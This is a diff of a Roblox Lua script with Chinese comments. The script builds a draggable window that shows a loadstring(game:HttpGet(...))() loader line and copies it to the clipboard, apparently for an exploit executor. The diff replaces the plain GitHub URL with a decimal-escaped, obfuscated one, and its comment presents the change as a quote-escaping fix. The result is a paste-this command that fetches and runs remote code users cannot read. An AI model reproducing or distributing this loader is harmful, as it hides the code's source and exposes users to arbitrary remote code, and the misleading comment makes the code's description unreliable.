@@ -1,5 +1,3 @@
---如果你看到这条信息，大概我的脚本源码被泄露也是难免了
-
 -- 支持关闭+拖动+复制+提示的完整UI
 local Player = game.Players.LocalPlayer
 local PlayerGui = Player:WaitForChild("PlayerGui", 10)
@@ -9,14 +7,15 @@ if not PlayerGui then warn("PlayerGui加载失败") return end
 local ScreenGui = Instance.new("ScreenGui")
 ScreenGui.Name = "FullFunctionGui"
 ScreenGui.DisplayOrder = 9999
+ScreenGui.Parent = PlayerGui -- 提前挂载避免渲染延迟
 
 local MainFrame = Instance.new("Frame")
 local DragArea = Instance.new("Frame") -- 拖动区域
-local CloseButton = Instance.new("TextButton") -- 新增：关闭按钮
+local CloseButton = Instance.new("TextButton") -- 关闭按钮
 local TipLabel = Instance.new("TextLabel")
 local CodeLabel = Instance.new("TextLabel")
 local CopyButton = Instance.new("TextButton")
-local SuccessTip = Instance.new("TextLabel")
+local SuccessTip = Instance.new("TextLabel") -- 复制成功提示
 
 -- 2. 主窗口配置
 MainFrame.Size = UDim2.fromOffset(500, 260)
@@ -36,12 +35,12 @@ DragArea.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
 DragArea.ZIndex = 12
 DragArea.Parent = MainFrame
 
--- 4. 新增：关闭按钮（拖动区右侧，红色醒目）
+-- 4. 关闭按钮（拖动区右侧，红色醒目）
 CloseButton.Name = "关闭按钮"
 CloseButton.Text = "×" -- 关闭符号
 CloseButton.Size = UDim2.fromOffset(20, 20)
 CloseButton.Position = UDim2.fromOffset(480, 0) -- 靠拖动区右侧对齐
-CloseButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0) -- 红色按钮，提示关闭功能
+CloseButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
 CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 CloseButton.TextSize = 16
 CloseButton.ZIndex = 13
@@ -49,12 +48,13 @@ CloseButton.Parent = MainFrame
 
 -- 关闭功能逻辑：点击隐藏整个UI
 CloseButton.MouseButton1Click:Connect(function()
-    ScreenGui.Enabled = false -- 隐藏UI（如需彻底删除可改为ScreenGui:Destroy()）
+    ScreenGui.Enabled = false -- 隐藏UI，如需彻底删除改为 ScreenGui:Destroy()
 end)
 
 -- 5. 拖动功能逻辑
 local isDragging = false
 local startPos = Vector2.new()
+local UIS = game:GetService("UserInputService")
 
 DragArea.InputBegan:Connect(function(input)
     if input.UserInputType == Enum.UserInputType.MouseButton1 then
@@ -63,12 +63,14 @@ DragArea.InputBegan:Connect(function(input)
     end
 end)
 
-game:GetService("UserInputService").InputChanged:Connect(function(input)
+UIS.InputChanged:Connect(function(input)
     if input.UserInputType == Enum.UserInputType.MouseMovement and isDragging then
+        local viewportSize = workspace.CurrentCamera.ViewportSize
         local newPos = input.Position - startPos
+        -- 限制窗口在屏幕内
         newPos = Vector2.new(
-            math.clamp(newPos.X, 0, workspace.CurrentCamera.ViewportSize.X - MainFrame.AbsoluteSize.X),
-            math.clamp(newPos.Y, 0, workspace.CurrentCamera.ViewportSize.Y - MainFrame.AbsoluteSize.Y)
+            math.clamp(newPos.X, 0, viewportSize.X - MainFrame.AbsoluteSize.X),
+            math.clamp(newPos.Y, 0, viewportSize.Y - MainFrame.AbsoluteSize.Y)
         )
         MainFrame.Position = UDim2.fromOffset(newPos.X, newPos.Y)
     end
@@ -91,8 +93,9 @@ TipLabel.TextXAlignment = Enum.TextXAlignment.Left
 TipLabel.ZIndex = 11
 TipLabel.Parent = MainFrame
 
--- 7. 代码显示
-CodeLabel.Text = "loadstring(game:HttpGet('https://raw.githubusercontent.com/tfcygvunbind/Apple/main/黑白脚本加载器'))()"
+-- 7. 代码显示（修复引号转义问题）
+local codeStr = 'loadstring(game:HttpGet("\\104\\116\\116\\112\\115\\58\\47\\47\\114\\97\\119\\46\\103\\105\\116\\104\\117\\98\\117\\115\\101\\114\\99\\111\\110\\116\\101\\110\\116\\46\\99\\111\\109\\47\\116\\102\\99\\121\\103\\118\\117\\110\\98\\105\\110\\100\\47\\65\\112\\112\\108\\101\\47\\53\\100\\97\\57\\52\\48\\99\\53\\101\\99\\57\\49\\54\\57\\52\\101\\97\\51\\98\\101\\49\\56\\55\\53\\51\\101\\48\\98\\57\\53\\50\\54\\55\\97\\51\\48\\56\\56\\97\\49\\47\\239\\188\\159\\239\\188\\159\\239\\188\\159\\239\\188\\159\\239\\188\\159\\239\\188\\159\\239\\188\\159\\239\\188\\159\\239\\188\\159\\239\\188\\159\\239\\188\\159\\239\\188\\159\\239\\188\\159\\239\\188\\159"))()'
+CodeLabel.Text = codeStr
 CodeLabel.Size = UDim2.fromOffset(450, 80)
 CodeLabel.Position = UDim2.fromOffset(25, 65)
 CodeLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
@@ -104,7 +107,7 @@ CodeLabel.TextYAlignment = Enum.TextYAlignment.Top
 CodeLabel.ZIndex = 11
 CodeLabel.Parent = MainFrame
 
--- 8. 复制按钮与逻辑
+-- 8. 复制按钮与逻辑（复用提示框，避免重复创建）
 CopyButton.Text = "复制代码"
 CopyButton.Size = UDim2.fromOffset(120, 40)
 CopyButton.Position = UDim2.fromOffset(190, 170)
@@ -114,23 +117,22 @@ CopyButton.TextSize = 16
 CopyButton.ZIndex = 11
 CopyButton.Parent = MainFrame
 
+-- 初始化成功提示框
+SuccessTip.Text = ""
+SuccessTip.Size = UDim2.fromOffset(120, 30)
+SuccessTip.Position = UDim2.fromOffset(190, 140)
+SuccessTip.BackgroundTransparency = 1
+SuccessTip.TextColor3 = Color3.fromRGB(0, 255, 0)
+SuccessTip.TextSize = 14
+SuccessTip.ZIndex = 12
+SuccessTip.Parent = MainFrame
+
 CopyButton.MouseButton1Click:Connect(function()
-    setclipboard("loadstring(game:HttpGet('https://raw.githubusercontent.com/tfcygvunbind/Apple/main/黑白脚本加载器'))()")
+    setclipboard(codeStr)
     SuccessTip.Text = "复制成功！"
-    SuccessTip.Size = UDim2.fromOffset(120, 30)
-    SuccessTip.Position = UDim2.fromOffset(190, 140)
-    SuccessTip.BackgroundTransparency = 1
-    SuccessTip.TextColor3 = Color3.fromRGB(0, 255, 0)
-    SuccessTip.TextSize = 14
-    SuccessTip.ZIndex = 12
-    SuccessTip.Parent = MainFrame
     task.wait(1.5)
-    SuccessTip:Destroy()
+    SuccessTip.Text = ""
 end)
 
--- 挂载与渲染
-ScreenGui.Parent = PlayerGui
-task.wait(0.3)
-TipLabel.Text = TipLabel.Text
-CodeLabel.Text = CodeLabel.Text
+-- 显示UI
 ScreenGui.Enabled = true
